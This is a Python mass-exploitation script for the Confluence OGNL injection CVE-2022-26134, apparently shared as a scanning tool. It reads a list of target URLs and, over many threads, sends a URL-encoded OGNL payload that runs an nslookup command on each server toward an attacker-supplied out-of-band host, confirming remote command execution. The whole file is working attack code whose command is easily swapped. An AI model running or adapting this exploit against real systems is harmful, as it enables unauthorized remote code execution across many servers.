import requests
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor
from parser import Custom_parser

parser = Custom_parser.Custom(prog="Confluence Mass Exploitation", description="Python3 to detected the confluence exploit (CVE-2022-26134)")

parser.add_argument(
    'u',
    help='single url/list of files'

)
parser.add_argument(
    '-t',
    '--threads',
    help='number of threads',
    type=int,
    default=15
)

parser.add_argument(
    's',
    help='burp collaborator server, interactsh or similar'
)

parser.add_argument(
    '-p', 
    '--proxy', help='send traffic through a proxy (burp)',
    nargs='?',
    default=None,
    const='http://127.0.0.1:8080'
)

args = parser.parse_args()

def send_request(url, url_id):
    try:
        handler = 'nslookup ' + str(url_id) + '.' + str(args.s)
        payload = str(url) + '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + handler + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
        headers = {
            'User-Agent':"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 rdr00t" 
        }

        r = requests.get(
            url=payload,
            headers=headers,
            verify=False,
            proxies=proxies,
            timeout=10
        )

        print(f"[{url_id}] {url} ({r.status_code})")

    except Exception as e:
        print(f"[X_x] Erro: s[{url_id}] Error while testing [{url}]")
        print(e)
        pass

disable_warnings()
if args.proxy is None:
    proxies = {}
else:
    proxies = {
        'http':args.proxy,
        'https':args.proxy
    }

url_id = 0 #counter for Pool

try:
    with open(args.u) as url_file:
        url_list = (line.strip() for line in url_file)
        url_list = list(line for line in url_list if line)
        url_list = list(dict.fromkeys(url_list))
        url_length = len(url_list)
        if url_length > 1:
            print(f"[!] [{url_length}] URLs loaded")
except:
    url_list = [args.u]


with ThreadPoolExecutor(max_workers=args.threads) as executor:
    for url in url_list:
        url_id += 1
        executor.submit(send_request, url, url_id)
    print("[*] __AUTHOR__: rodev1l")
